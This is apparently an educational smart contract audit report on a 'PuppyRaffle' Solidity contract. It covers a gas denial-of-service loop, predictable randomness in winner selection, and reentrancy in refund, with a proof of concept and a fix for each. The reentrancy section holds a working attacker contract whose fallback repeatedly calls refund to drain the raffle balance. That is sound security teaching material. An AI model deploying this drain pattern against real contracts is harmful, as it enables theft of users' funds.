### [M-#] TITLE Checking For Duplicate Players in `PuppyRaffle::enterRaffle` by Looping through The Players Array is a Potential DOS Attack Incrementing Gas Costs For Future Entrants

**Description:** The `PuppyRaffle::enterRaffle` function iterates through the `players` array to check for duplicates. However, it performs this check using a nested loop, comparing each player to every other player in the array. This implementation creates a quadratic time complexity O(n^2) relative to the number of players.

``` solidity
// @audit Dos Attack
for(uint256 i = 0; i < players.length -1; i++){
    for(uint256 j = i+1; j< players.length; j++){
    require(players[i] != players[j],"PuppyRaffle: Duplicate Player");
  }
}
```

**Impact:** The gas costs for entering the raffle will significantly increase as more players join. This is due to the quadratic increase in the number of comparisons required to check for duplicates. Eventually, the gas cost to enter the raffle will exceed the block gas limit, creating a Denial of Service (DoS) vulnerability where no new players can enter the raffle. 

**Proof of Concept:**

If we have 2 sets of 150 players enter, the gas costs will be as such:
- 1st 150 players: ~12873449 gas
- 2nd 150 players: ~40998589 gas

This is more than 3x more expensive for the second 150 players.

<details>
<summary>Proof of Code</summary>

```solidity
function testDenialOfService() public {
      // Foundry lets us set a gas price
      vm.txGasPrice(1);

      // Creates 150 addresses
      uint256 playersNum = 150;
      address[] memory players = new address[](playersNum);
      for (uint256 i = 0; i < players.length; i++) {
          players[i] = address(i);
      }

      // Gas calculations for first 150 players
      uint256 gasStart = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
      uint256 gasEnd = gasleft();
      uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
      console.log("Gas cost of the first 150 players: ", gasUsedFirst);

      // Creates another array of 150 players
      address[] memory playersTwo = new address[](playersNum);
      for (uint256 i = 0; i < playersTwo.length; i++) {
          playersTwo[i] = address(i + playersNum);
      }

      // Gas calculations for second 150 players
      uint256 gasStartTwo = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
      uint256 gasEndTwo = gasleft();
      uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
      console.log("Gas cost of the second 150 players: ", gasUsedSecond);

      assert(gasUsedSecond > gasUsedFirst);
  }
```
</details>

**Recommended Mitigation:** 
1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a `uint256` id, and the mapping would be a player address mapped to the raffle Id.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+           addressToRaffleId[newPlayers[i]] = raffleId;
        }

-   // Check for duplicates
-   for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    }
```

3. Alternatively, you could use [OpenZeppelin's EnumerableSet library](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet).

### [M-#] Weak Randomness in `PuppyRaffle::selectWinner` allows anyone to choose winner

**Description:** The `PuppyRaffle::selectWinner` function relies on `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` to generate the random winner index. using on-chain values as a randomness seed is a well-known attack vector in blockchain systems. 

- `block.timestamp`: Can be manipulated by miners/validators to some degree.
- `block.difficulty`: (Now `prevrandao` in Merge) Can be known or influenced.
- `msg.sender`: The caller controls this address.

Because these values are predictable or controllable, a malicious actor can calculate the result of the "random" number generation *before* forcing the transaction to be mined. This allows them to ensure they only call `selectWinner` when the result is favorable to them, or to front-run the transaction if they see a losing result.

**Impact:** 
1. **Winner Manipulation:** Attackers can ensure they win the raffle.
2. **Risk-Free Lottery:** By calculating the winner index off-chain or via simulation, an attacker can determine if they will lose. If so, they can call `refund` (as described in other logic) or simply choose not to participate/call the function, effectively giving them a risk-free shot at the prize.
3. **Denial of Service:** As a side effect, the "risk-free" refund mechanism described elsewhere relies on this predictability.

**Proof of Concept:**
1. Validators can know ahead of time what the `block.timestamp` and `block.difficulty` will be and use that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao.
2. User mines/manipulates their own block, and only includes their transaction if the resulting `preevrandao` (or difficulty) and `timestamp` produces a hash that lets them win. 
3. This allows a validator to guarantee they win the raffle.

// Research if there are any other ways to manipulate the randomness
// Research if point 2 is still an issue when we are using chainlink VRF

**Recommended Mitigation:** 
Replace the current randomness mechanism with Chainlink VRF (Verifiable Random Function):

1. **Integrate Chainlink VRF v2**: This provides cryptographically secure, provably fair randomness that cannot be predicted or manipulated by validators, miners, or participants.

2. **Remove on-chain entropy sources**: Do not use `msg.sender`, `block.timestamp`, or `block.difficulty/prevrandao` as sources of randomness.

3. **Implementation Pattern**:
   - Request randomness from Chainlink VRF when raffle duration ends
   - Store request ID and wait for callback
   - Use the VRF-provided random number to select winner in the callback function
   - Ensure proper access controls on the callback function

Note: Chainlink VRF introduces a two-transaction pattern (request + fulfill), so the contract architecture will need to be refactored to accommodate this asynchronous flow.
### [M-#] Reentrancy in `PuppyRaffle::refund` allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow the Checks-Effects-Interactions pattern (or CEI) and as a result, enables participants to drain the contract balance. 

In the `refund` function, we perform an external call to `msg.sender` *before* updating the `players` array to zero out the player. 

```solidity
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee); // <@-- External call writes to address(0)

        players[playerIndex] = address(0); // <@-- State update happens AFTER external call
        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle can have a `fallback`/`receive` function that calls the `refund` function again and claim another refund. They can continue the cycle till the contract balance is drained. 

**Impact:** All fees paid by raffle entrants can be stolen by the malicious participant. 

**Proof of Concept:** 

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `refund` from their attack contract, draining the contract balance.

**Proof of Code**

<details>
<summary>Code</summary>

```solidity
function test_reentrancyRefund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle); 
    address attackUser = makeAddr("attackUser"); 
    vm.deal(attackUser, 1 ether);

    uint256 startngAttackerBalance = address(attacker).balance;
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

    vm.prank(attackUser);
    attacker.attack{value: entranceFee}();

    uint256 endingAttackerBalance = address(attacker).balance;
    uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;

    console.log("Starting attacker balance", startngAttackerBalance);
    console.log("Ending attacker balance", endingAttackerBalance);
    console.log("Starting puppy raffle balance", startingPuppyRaffleBalance);
    console.log("Ending puppy raffle balance", endingPuppyRaffleBalance);

}

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```

</details>


**Recommended Mitigation:** 
1. **Use CEI pattern:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well. 

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

2. **Use ReentrancyGuard:**
Alternatively, you can use [OpenZeppelin's ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) modifier. This prevents a function from being called while it is already executing.

> **Note:** The `nonReentrant` modifier works by using a mutex lock (a boolean flag) that is set to true when the function starts and set back to false when it ends. If the function is re-entered while the flag is true, the transaction reverts.

```diff
+ import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";

- contract PuppyRaffle is ERC721, Ownable {}
+ contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {}

-   function refund(uint256 playerIndex) public {}
+   function refund(uint256 playerIndex) public nonReentrant {}
```
